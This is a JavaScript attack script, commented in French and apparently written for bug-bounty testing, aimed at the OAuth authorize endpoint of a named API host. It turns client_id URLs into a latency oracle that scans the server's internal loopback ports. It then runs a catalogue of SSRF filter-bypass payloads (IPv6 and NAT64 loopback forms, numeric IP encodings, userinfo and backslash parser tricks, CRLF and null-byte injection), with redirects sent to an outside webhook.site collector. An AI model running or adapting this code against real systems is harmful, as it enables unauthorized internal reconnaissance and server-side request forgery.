const AS = "https://bugsecure-api.senintel.sn";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const F = async (url, opt = {}) => { for (let a = 0; a < 3; a++) { try { return await fetch(url, { ...opt, signal: AbortSignal.timeout(25000) }); } catch (e) { await sleep(2000); } } return null; };

async function asLatency(clientId, label) {
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", clientId);
  u.searchParams.set("redirect_uri", BASE + "/cb");
  u.searchParams.set("scope", "programs:read");
  u.searchParams.set("state", "bb-" + Math.random().toString(36).slice(2));
  u.searchParams.set("code_challenge", "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM");
  u.searchParams.set("code_challenge_method", "S256");
  u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
  const t0 = Date.now();
  const r = await F(u, { redirect: "manual" });
  const dt = r ? Date.now() - t0 : -1;
  const loc = r?.headers.get("location") || "";
  const err = (loc.match(/code=([^&]+)/) || [])[1] || (loc.includes("consent") ? "CONSENT" : "?");
  console.log("  " + label.padEnd(46) + String(dt + "ms").padStart(7) + "  " + err);
  await sleep(4200);
  return { dt, err };
}

const TS = Date.now();
// 1) signature de reference : quels ports de la boucle locale sont "vivants" ?
console.log("=== A) ORACLE DE PORT (latence AS via CIMD client_id) ===");
console.log("    (5-6s = port ouvert qui ne repond pas en HTTP ; 0.6s = refuse/filtre)");
const PORTS = [3000, 8080, 8099, 9000, 5432, 6379, 27017, 9200, 11211, 2379, 8500, 22, 80, 443, 4000, 5000];
const results = [];
for (const p of PORTS) {
  const r = await asLatency(`http://127.0.0.1:${p}/?probe=${TS}-${p}`, "127.0.0.1:" + p);
  results.push([p, r.dt, r.err]);
}
console.log("\n  === TABLE ===");
for (const [p, dt, err] of results) console.log("   port " + String(p).padEnd(6) + String(dt + "ms").padStart(8) + "  " + err + (dt > 3000 ? "   <<<< OUVERT (silencieux)" : ""));
console.log("\n  ports ouverts (signature >3s) : " + results.filter((r) => r[1] > 3000).map((r) => r[0]).join(", "));
console.log("  ports fermes (signature <1.5s) : " + results.filter((r) => r[1] < 1500).map((r) => r[0]).join(", "));

console.log("\n=== B) contournements de filtre SSRF (fiche arsenal : NAT64 / parser differential) ===");
const BYPASS = [
  ["direct 127.0.0.1:3000 (ref)", "http://127.0.0.1:3000/"],
  ["IPv6 loopback [::1]:3000", "http://[::1]:3000/"],
  ["IPv4-mapped [::ffff:127.0.0.1]:3000", "http://[::ffff:127.0.0.1]:3000/"],
  ["IPv4-mapped long 0:0:0:0:0:ffff:7f00:1", "http://[0:0:0:0:0:ffff:7f00:1]:3000/"],
  ["NAT64 local-use 64:ff9b:1::7f00:1", "http://[64:ff9b:1::7f00:1]:3000/"],
  ["NAT64 well-known 64:ff9b::7f00:1", "http://[64:ff9b::7f00:1]:3000/"],
  ["decimal 2130706433", "http://2130706433:3000/"],
  ["hex 0x7f000001", "http://0x7f000001:3000/"],
  ["octal 017700000001", "http://017700000001:3000/"],
  ["court 127.1", "http://127.1:3000/"],
  ["point final 127.0.0.1.", "http://127.0.0.1.:3000/"],
  ["userinfo x@127.0.0.1", "http://x@127.0.0.1:3000/"],
  ["backslash-@ (webhook\\@127.0.0.1)", "http://webhook.site\\@127.0.0.1:3000/"],
  ["backslash-@ inverse (127.0.0.1\\@webhook)", "http://127.0.0.1:3000\\@webhook.site/"],
  ["fragment #@webhook", "http://127.0.0.1:3000#@webhook.site/"],
  ["null %00", "http://127.0.0.1%00.webhook.site:3000/"],
  ["CRLF injecte %0d%0a", "http://127.0.0.1:3000%0d%0aHost:%20webhook.site/"],
  ["tab %09", "http://127.0.0.1%09:3000/"],
];
const bp = [];
for (const [n, url] of BYPASS) {
  const r = await asLatency(url + (url.includes("?") ? "&" : "?") + "p=" + TS, n);
  bp.push([n, r.dt, r.err]);
}
console.log("\n  === contournements qui heritent de la signature 5-6s (=> fetch interne reussi) ===");
for (const [n, dt, err] of bp) console.log("   " + n.padEnd(46) + String(dt + "ms").padStart(8) + (dt > 3000 ? "   <<<<<< BYPASS REUSSI" : ""));
